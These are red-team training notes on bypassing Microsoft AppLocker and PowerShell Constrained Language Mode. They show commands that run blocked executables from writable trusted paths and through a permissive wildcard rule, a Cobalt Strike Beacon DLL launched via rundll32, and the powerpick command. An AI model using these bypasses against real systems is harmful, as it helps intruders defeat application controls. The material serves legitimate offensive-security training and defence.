## Description:  

### AppLocker
AppLocker is Microsoft's application whitelisting technology that can restrict the executables, libraries and scripts that are permitted to run on a system. AppLocker rules are split into 5 categories - Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement (enforced, audit only, none).

If an AppLocker category is enforced, then by default everything within that category is blocked. Rules can then be added to allow principals to execute files within that category based on a set of criteria. The rules themselves can be defined based on file attributes such as path, publisher or hash. AppLocker has a set of default allow rules such as, "allow everyone to execute anything withinÂ `C:\Windows\*`" - the theory being that everything inÂ `C:\Windows`Â is trusted and safe to execute.

Specific deny rules can be used to override allow rules, which are commonly used to blockÂ ["LOLBAS's"](https://lolbas-project.github.io/).

TakeÂ [wmic](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)Â as an example - even though it's a "trusted" native Windows utility, it can be used to execute "untrusted" code that would bypass AppLocker. So a deny rule forÂ `wmic.exe`Â would supersede the allow rule mentioned above.

Trying to execute anything that is blocked by AppLocker looks like this:

```
C:\>test.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:

1.  Executing untrusted code via trusts LOLBAS's.
2.  Finding writeable directories within "trusted" paths.
3.  By default, AppLocker is not even applied to Administrators.

It is of course common for system administrators to add custom rules to cater for particular software requirements. Badly written or overly permissive rules can open up loopholes that we can take advantage of.

Like LAPS, AppLocker creates aÂ `Registry.pol`Â file in theÂ `GpcFileSysPath`Â of the GPO which we can read with theÂ `Parse-PolFile`Â cmdlet. This is one of the default rules.

```
KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-6e17-4653-8f75-050b80acca20
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 736
ValueData   : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20"
                Name="(Default Rule) All files located in the Program Files folder"
                Description="Allows members of the Everyone group to run applications that are located in the Program Files folder."
                UserOrGroupSid="S-1-1-0"
                Action="Allow">
                <Conditions>
                  <FilePathCondition Path="%PROGRAMFILES%\*"/>
                </Conditions>
              </FilePathRule>
```

AppLocker rules applied to a host can also be read from the local registry atÂ `HKLM\Software\Policies\Microsoft\Windows\SrpV2`.

Interestingly, Cobalt Strike'sÂ `jump psexec[64]`Â still works against the default AppLocker rules, because it will upload a service binary intoÂ `C:\Windows`, which is a trusted location and thus allowed to execute.

Uploading intoÂ `C:\Windows`Â requires elevated privileges, but there are places likeÂ `C:\Windows\Tasks`Â that are writeable by standard users. These areas are useful in cases where you have access to a machine (e.g. in an assumed breach scenario), and need to break out of AppLocker to run post-ex tooling.

```
C:\Users\Administrator\Desktop>test.exe
This program is blocked by group policy. For more information, contact your system administrator.

C:\Users\Administrator\Desktop>move test.exe C:\Windows\Tasks
        1 file(s) moved.

C:\Users\Administrator\Desktop>C:\Windows\Tasks\test.exe
Bye-Bye AppLocker!
```

This is an example of an overly permissive rule.
```
KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\3470949d-4a86-4ec5-aa37-5ad7acd6a925
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 482
ValueData   : <FilePathRule Id="3470949d-4a86-4ec5-aa37-5ad7acd6a925"
                Name="Packages"
                Description="Allow custom packages"
                UserOrGroupSid="S-1-1-0"
                Action="Allow">
                  <Conditions>
                    <FilePathCondition Path="%OSDRIVE%\*\Packages\*"/>
                  </Conditions>
                </FilePathRule>
```

The pathÂ `%OSDRIVE%\*\Packages\*`Â expands toÂ `C:\*\Packages\*`, (assumingÂ `C:\`Â is indeed the OS drive, which it almost always is) - this means we could create a folder calledÂ `Packages`Â anywhere onÂ `C:\`Â and run exe's from it because of the wildcards.

```
C:\Users\Administrator\Desktop>test.exe
This program is blocked by group policy. For more information, contact your system administrator.

C:\Users\Administrator\Desktop>mkdir Packages

C:\Users\Administrator\Desktop>move test.exe Packages
        1 file(s) moved.

C:\Users\Administrator\Desktop>Packages\test.exe
Bye-Bye AppLocker!
```

DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.

Cobalt Strike can output Beacon to a DLL that can be run withÂ **rundll32**.

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8A6C-CD61

 Directory of C:\Users\Administrator\Desktop

05/17/2021  11:01 PM    <DIR>          .
05/17/2021  11:01 PM    <DIR>          ..
05/17/2021  10:59 PM           311,808 beacon.dll

C:\>C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
```

```
beacon> link dc-1
[+] established link to child beacon: 10.10.15.75
```

If you have access to a Domain Controller or a machine with the appropriate packages installed, you can also enumerate the AppLocker configuration using the native GPO report commands - theÂ `Get-GPOReport`Â cmdlet andÂ `gpresult`Â utility. Â The most convenient means of consuming the output is to save the report in HTML format, download it to your machine and open in a browser.


### PowerShell Constrained Language Mode

When AppLocker is enabled PowerShell is placed into Constrained Language Mode (CLM), which restricts it to core types.Â `$ExecutionContext.SessionState.LanguageMode`Â will show the language mode of the executing process.
```
beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode

PSComputerName RunspaceId                           Value              
-------------- ----------                           -----              
dc-1           9dd4aebc-540e-4683-b3f7-07b6f799266e ConstrainedLanguage
```

This makes most PowerShell tradecraft difficult.Â `jump winrm[64]`Â and other PowerShell scripts will fail with the error:Â **Cannot create type. Only core types are supported in this language mode.**

```
beacon> remote-exec winrm dc-1 [math]::Pow(2,10)

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">
```

CLM is as fragile as AppLocker, so any AppLocker bypass can result in CLM bypass. Beacon has aÂ `powerpick`Â command, which is an "unmanaged" implementation of tapping into a PowerShell runspace, without usingÂ `powershell.exe`.

So if we find an AppLocker bypass rule in order to execute a Beacon,Â `powerpick`Â can be used to execute post-ex tooling outside of CLM.Â `powerpick`Â is also compatible withÂ `powershell-import`.

```

```
